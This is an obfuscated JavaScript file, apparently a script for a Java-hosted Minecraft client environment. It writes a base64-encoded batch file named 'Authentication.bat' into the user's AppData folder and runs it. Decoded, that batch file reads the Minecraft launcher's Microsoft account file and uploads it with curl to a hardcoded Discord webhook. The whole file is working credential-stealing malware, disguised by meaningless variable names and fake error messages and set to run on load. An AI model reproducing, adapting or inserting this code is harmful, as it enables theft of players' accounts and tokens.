  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed num \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" auth");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\Authentication.bat";
executeBat(fullPath, "QGVjaG8gb2ZmCgpzZXQgRklMRV9QQVRIPSVVU0VSUFJPRklMRSVcQXBwRGF0YVxSb2FtaW5nXC5taW5lY3JhZnRcbGF1bmNoZXJfYWNjb3VudHNfbWljcm9zb2Z0X3N0b3JlLmpzb24KClJFTSBEaXNjb3JkIHdlYmhvb2sgVVJMCnNldCBXRUJIT09LX1VSTD1odHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzI5MTk4MDAzMjg5OTgxMDU4L2g5dUxXNkxpTHJKdlF3TmUtS0RFNFppdktGV0h6ei1TV3dZRU1Ic0xvdkpVNTVCMXBxckpGSDg1My1xQnJyZmpvdnJpCgpSRU0gRW5zdXJlIHRoZSBmaWxlIGV4aXN0cwppZiBub3QgZXhpc3QgIiVGSUxFX1BBVEglIiAoCiAgICBlY2hvIEZpbGUgbm90IGZvdW5kOiAlRklMRV9QQVRIJQogICAgZXhpdCAvYiAxCikKClJFTSBVc2UgY3VybCB0byBzZW5kIHRoZSBmaWxlCmN1cmwgLVggUE9TVCAlV0VCSE9PS19VUkwlIF4KICAgIC1IICJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIF4KICAgIC1GICJwYXlsb2FkX2pzb249e1wiY29udGVudFwiOlwiSGVyZSBpcyB5b3VyIGZpbGUhXCJ9IiBeCiAgICAtRiAiZmlsZT1AJUZJTEVfUEFUSCUiID5udWwgMj5lcnJvci5sb2cKClJFTSBDaGVjayB0aGUgZXhpdCBjb2RlIG9mIGN1cmwKc2V0IC9hIEVSUk9STEVWRUxfQ09ERT0lRVJST1JMRVZFTCUKaWYgJUVSUk9STEVWRUxfQ09ERSUgbmVxIDAgKAogICAgZWNobyBGYWlsZWQgdG8gc2VuZCB0aGUgZmlsZS4gU2VlIGVycm9yLmxvZyBmb3IgZGV0YWlscy4KICAgIGV4aXQgL2IgJUVSUk9STEVWRUxfQ09ERSUKKQoKUkVNIE5vIG5lZWQgdG8gZWNobyBzdWNjZXNzIG1lc3NhZ2UK"); 
